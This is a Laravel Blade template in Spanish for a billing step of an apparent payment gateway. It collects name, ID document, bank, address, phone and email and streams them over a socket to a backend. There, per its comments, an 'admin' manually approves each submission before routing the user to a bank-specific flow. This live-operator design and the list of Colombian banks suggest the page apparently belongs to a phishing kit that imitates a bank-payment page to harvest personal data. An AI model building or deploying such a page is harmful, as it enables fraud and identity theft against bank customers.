@extends('layouts.app')

@section('title', 'Detalles de Facturación')


    @include('components.alert', [
      'id' => 'error_data',
      'type' => 'error_field',
      'text' => 'Datos invalidos, revisa e intenta nuevamente.',
      'show' => false,
    ])
    @include('components.alert', [
      'id' => 'error_custom',
      'type' => 'error_field',
      'show' => false,
    ])
    @include('components.alert', [
      'id' => 'success',
      'type' => 'success',
      'show' => false,
    ])


@section('content')
  <div class="step-process">
    <img class="step-process-img" src="{{asset('assets/img/home/step-process-2-mobile.svg')}}">
  </div>
  <div class="step-content billing">
    <h3 class="form-title">Facturación</h3>
    <div class="billing-form">
      <form id="formData">
        @csrf
        <div class="input-container">
          <label for="txtName">Nombre</label>
          <input type="text" name="name" autocomplete="Nombre" id="txtName" placeholder=""
            oninput="this.value = this.value.replace(/\s+/g, '')" pattern="^[a-zA-Z0-9]+$" required>
        </div>
        <div class="input-container">
          <label for="txtLastName">Apellido</label>
          <input type="text" name="lastname" autocomplete="Apellido" id="txtLastName" placeholder=""
            oninput="this.value = this.value.replace(/\s+/g, '')" pattern="^[a-zA-Z0-9]+$" required>
        </div>
        <div class="input-container">
          <label for="txtName">Documento</label>
          <input type="text" name="document" autocomplete="Documento" id="txtDoc" placeholder=""
            oninput="this.value = this.value.replace(/\s+/g, '')" pattern="^[a-zA-Z0-9]+$" required>
        </div>
        <div class="input-container">
          <label for="txtPersonType">Tipo de Persona</label>
          <select name="personType" id="txtPersonType" required>
            <option value="">Seleccionar</option>
            <option value="natural">Natural</option>
            <option value="juridica">Jurídica</option>
          </select>
        </div>
        <div class="input-container">
          <label for="txtBank">Banco</label>
          <select name="bank" id="txtBank" required>
            <option value="">Seleccionar</option>
            <option value="AVVILLAS">BANCO AVVILLAS</option>
            <option value="Bancolombia">BANCOLOMBIA</option>
            <option value="BBVA">BANCO BBVA</option>
            <option value="Bogota">BANCO DE BOGOTA</option>
            <option value="Cajasocial">BANCO CAJA SOCIAL</option>
            <option value="Citibank">CITIBANK</option>
            <option value="Colpatria">COLPATRIA</option>
            <option value="Davivienda">DAVIVIENDA</option>
            <option value="Falabella">BANCO FALABELLA</option>
            <option value="Finandina">FINANDINA</option>
            <option value="Itau">ITAU</option>
            <option value="Nequi">NEQUI</option>
            <option value="Occidente">BANCO DE OCCIDENTE</option>
            <option value="Popular">BANCO POPULAR</option>
            <option value="Serfinanza">SERFINANZA</option>
            <option value="Tuya">Tuya</option>
          </select>
        </div>
        <div class="input-container">
          <label for="txtAddress">Dirección</label>
          <input type="text" name="address" autocomplete="Dirección" id="txtAddress" placeholder=""
            oninput="this.value = this.value.replace(/\s+/g, '')" pattern="^[a-zA-Z0-9]+$" required>
        </div>
        <div class="input-container">
          <label for="txtPhone">Teléfono</label>
          <input type="number" name="phone" autocomplete="Teléfono" id="txtPhone" placeholder="" required>
        </div>
        <div class="input-container">
          <label for="txtEmail">Correo</label>
          <input type="email" name="email" autocomplete="email" id="txtEmail" placeholder="" required>
        </div>
        <div class="btn-container">
          <input class="btn-continue" type="submit">Continuar</button>
          <button class="btn-return" type="button">Regresar al Comercio</button>
        </div>
      </form>
    </div>
  </div>
@endsection

@push('scripts')
  <script>
    document.addEventListener('DOMContentLoaded', async () => {
      // 1) Inicializa socket reutilizando tu script
      async function bootRealtime() {
        const res = await fetch("{{ route('pago.init') }}", {
          headers: { 'Accept': 'application/json' },
          credentials: 'same-origin',
        });

        const ct = res.headers.get('content-type') || '';
        const raw = await res.text();
        if (!res.ok) throw new Error(raw);
        if (!ct.includes('application/json')) throw new Error(raw);

        const data = JSON.parse(raw);
        if (!data?.ok) throw new Error('bad_response');

        // ✅ Flujo general: sin bank, step=2, alertId de esta pantalla (si usas)
        window.RT = window.RT || {};
        let waitingNewDecision = false;
        RT.sessionId = data.sessionId;
        RT.alertId = RT.alertId;
        RT.basePath = "/pago"; // por si agregas buildStepUrl luego

        // IMPORTANTE: tu initSocketConnection exige sessionToken en auth: { token: sessionToken }
        window.initSocketConnection(
          data.nodeUrl,
          data.sessionId,
          data.sessionToken,
          null,  // bank null (flujo general)
        );
      }
      try {
        await bootRealtime();
      } catch (e) {
        console.error("bootRealtime error", e);
      }


      registerSocketUpdateCallback(function (s) {
        // Aquí puedes reaccionar extra sin redirigir manualmente
        console.log(s)
        console.log("waiting?", waitingNewDecision);

        if(!String(s.action).startsWith('DATA')) {
          try { sessionStorage.removeItem('rt_last_error'); } catch {}
          RT.step = 1;
        }


        // ✅ si acabamos de reintentar, ignora AUTH_ERROR "viejo"
        if (waitingNewDecision && String(s.action) === 'DATA_ERROR') {
          window.showAlert('error_data');
          return;
        }

        if (String(s.action).endsWith('_WAIT_ACTION')) {
          waitingNewDecision = false;
          lockUI(true);
          return;
        }
      });

      // 2) Submit del formulario => evento DATA
      const form = document.getElementById('formData');
      form.addEventListener('submit', (e) => {
        e.preventDefault();

        const fd = new FormData(form);
        const payload = Object.fromEntries(fd.entries());

        // Asegura bank consistente (tu backend lo necesita)
        payload.bank = String(payload.bank || '').trim();

        console.log(payload)

        if (!payload.bank) {
          window.showAlert?.("error_custom", "Selecciona un banco.");
          return;
        }
        console.log(payload)
        // ✅ Emit usando tu wrapper (maneja loading, bad_state, etc.)
        waitingNewDecision = true;
        window.rtEmitSubmit('user:submit_data', {
          data: {
            name: `${payload.name} ${payload.lastname ?? ''}`,
            document: payload.document,
            bank: payload.bank.toLowerCase(),
            address: payload.address,
            phone: payload.phone,
            email: payload.email
          }
        }, (ack) => {
          console.log(ack)
          if (!ack?.ok) {
            if(ack?.error!=='bad_state') {
              window.hideLoading?.();
            }
            return;
          }

          // Normalmente aquí NO rediriges tú:
          // El admin decidirá y el server emitirá session:update:
          // DATA_WAIT_ACTION -> loading
          // DATA_ERROR -> volver step1
          // DATA + bank -> saltar al flujo bank
        });
      });
    });
  </script>
@endpush